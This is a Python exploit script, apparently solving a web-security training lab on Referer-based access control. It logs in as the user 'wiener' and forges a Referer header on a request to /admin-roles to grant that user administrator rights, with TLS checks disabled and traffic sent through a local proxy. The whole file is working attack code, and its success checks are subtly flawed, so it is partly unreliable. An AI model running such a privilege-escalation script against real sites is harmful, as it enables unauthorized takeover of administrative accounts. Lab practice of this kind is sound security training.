import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def promote_self(s, url):
    print("[+] Logging-in as wiener...")
    login_url = url + "/login"
    params = {
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Log out" and "wiener" in r.text:
        print("[+] Logged-in!")
        admin_panel_url = url + "/admin"
        promote_url = url + "/admin-roles?username=wiener&action=upgrade"
        header = {
            'Referer' : admin_panel_url
        }
        r = s.get(promote_url, headers=header, verify=False, proxies=proxies)
        if "Admin panel" and "wiener (ADMIN)" in r.text:
            print("[+] Exploit succeeded!")
            return
    else:
        print("[-] Error!")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()
    print("\n[+] Lab: Referer-based access control")
    print("[+] WebApp's Access Controls can be bypassed exploiting the REFERER field in HTTP requests")
    print("[+] Since the application only enforces checks at the logon, every further action from subpages o functions which refer back to the referer (pointing tothe main admin are) is considered safe\n")

    promote_self(s, url)


if __name__ == "__main__":
    main()